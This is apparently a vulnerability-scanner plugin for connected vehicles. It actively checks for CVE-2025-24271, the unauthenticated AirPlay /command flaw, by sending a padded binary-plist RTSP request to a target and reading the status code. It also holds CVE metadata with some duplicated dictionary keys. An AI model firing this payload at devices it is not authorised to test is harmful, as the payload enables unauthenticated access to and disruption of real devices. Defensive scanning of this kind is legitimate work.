#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _airplay_unauth_command_probe(host: str, port: int) -> dict:
    """CVE-2025-24271: send AirPlay /command without any pairing/auth headers."""
    body = b"bplist00" + b"A" * 2040
    request = (
        f"POST /command RTSP/1.0\r\n"
        f"CSeq: 11\r\n"
        f"Content-Type: application/x-apple-binary-plist\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    result = {"connected": False, "status": "", "error": ""}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((host, port))
        result["connected"] = True
        sock.sendall(request)
        resp = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"\r\n\r\n" in resp:
                break
        sock.close()
        result["response_len"] = len(resp)
        if resp:
            result["status"] = resp.split(b"\r\n")[0].decode(errors="replace")
    except ConnectionRefusedError:
        result["error"] = "connection_refused"
    except socket.timeout:
        result["error"] = "timeout"
    except OSError as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    airplay_port = int(params.get("airplay_port", 7000))

    evidence = {
        "cve": "CVE-2025-24271",
        "target": target_ip,
        "technique": "AirBorne: unauthenticated /command endpoint access probe (zero-click on LAN)",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-24271",
        "vuln_description": "Unauthenticated user on same network can send AirPlay commands without pairing",
    }

    result = _airplay_unauth_command_probe(target_ip, airplay_port)
    evidence["rtsp_probe"] = result

    if not result["connected"]:
        vulnerable = None
        evidence["note"] = "AirPlay port not reachable"
    elif "200" in result["status"]:
        vulnerable = True
        evidence["note"] = "Unauthenticated /command accepted (200 OK) - CVE-2025-24271 confirmed"
    elif "401" in result["status"] or "403" in result["status"]:
        vulnerable = False
        evidence["note"] = "Authentication required for /command - access control present"
    else:
        vulnerable = None
        evidence["note"] = f"Response: {result['status']}"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


VULN = {
    'cve': 'CVE-2025-24271',
    'year': 2025,
    'domain': 'application',
    'vendor_product': 'Unknown',
    'component': 'Unknown',
    'type': 'Unknown',
    'summary': 'CVE-2025-24271 AirBorne系列漏洞 Active Validation',
    'source_url': 'https://nvd.nist.gov/vuln/detail/CVE-2025-24271',
    'affected': [{'vendor': 'Unknown', 'product': 'Unknown', 'versions': []}],
    'id': 0,
    "id": 87,
    "cve": "CVE-2025-24271",
    "year": 2025,
    "domain": "车载互联/CarPlay相关",
    "vendor_product": "Apple AirPlay/CarPlay ecosystem",
    "component": "AirPlay SDK",
    "type": "AirBorne系列漏洞",
    "summary": "AirPlay/CarPlay集成设备潜在网络攻击面。",
    "source_description": "An access issue was addressed with improved access restrictions. This issue is fixed in iOS 18.4 and iPadOS 18.4, iPadOS 17.7.6, macOS Sequoia 15.4, macOS Sonoma 14.7.5, macOS Ventura 13.7.5, tvOS 18.4, visionOS 2.4. An unauthenticated user on the same network as a signed-in Mac could send it AirPlay commands without pairing.",
    "poc_status": "有Oligo公开研究；PoC有限",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24271",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-24271",
        "https://support.apple.com/en-us/122371",
        "https://support.apple.com/en-us/122372",
        "https://support.apple.com/en-us/122373",
        "https://support.apple.com/en-us/122374",
        "https://support.apple.com/en-us/122375",
        "https://support.apple.com/en-us/122377",
        "https://support.apple.com/en-us/122378",
        "https://cveawg.mitre.org/api/cve/CVE-2025-24271"
    ],
    "affected": [
        {
            "vendor": "Apple",
            "product": "iOS and iPadOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "18.4",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "iPadOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "17.7.6",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "macOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "13.7.5",
                    "versionType": "custom"
                },
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "14.7.5",
                    "versionType": "custom"
                },
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "15.4",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "tvOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "18.4",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "visionOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "2.4",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-24271",
        "Apple",
        "AirPlay",
        "CarPlay",
        "ecosystem",
        "SDK",
        "AirBorne",
        "access",
        "issue",
        "addressed",
        "improved",
        "restrictions",
        "fixed",
        "iPadOS",
        "macOS",
        "Sequoia",
        "Sonoma",
        "Ventura",
        "tvOS",
        "visionOS",
        "unauthenticated",
        "user",
        "same",
        "network",
        "signed-in",
        "could",
        "send",
        "commands",
        "without",
        "iOS and iPadOS"
    ],
    "active_probe_paths": ["/server-info"],
    "active_payload_text": "POST /command RTSP/1.0\r\nCSeq: 11\r\nContent-Type: application/x-apple-binary-plist\r\nContent-Length: 2048\r\n\r\n" + "bplist00" + "A" * 2040,
}


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc63CVE202524271AirBorneAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-087'
    meta_poc_name = 'CVE-2025-24271 AirBorne系列漏洞 Active Validation'
    meta_cve_id = 'CVE-2025-24271'
    meta_severity = 'High'
    meta_protocol = 'airplay'
    meta_target_os = ['all']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['application']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-24271'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2025-24271']
    meta_attack_surface = '车机APP/应用'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "63_AirPlay_SDK_AirBorne_Exposure_Audit") if "VULN" in dir() else "63_AirPlay_SDK_AirBorne_Exposure_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc63CVE202524271AirBorneAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
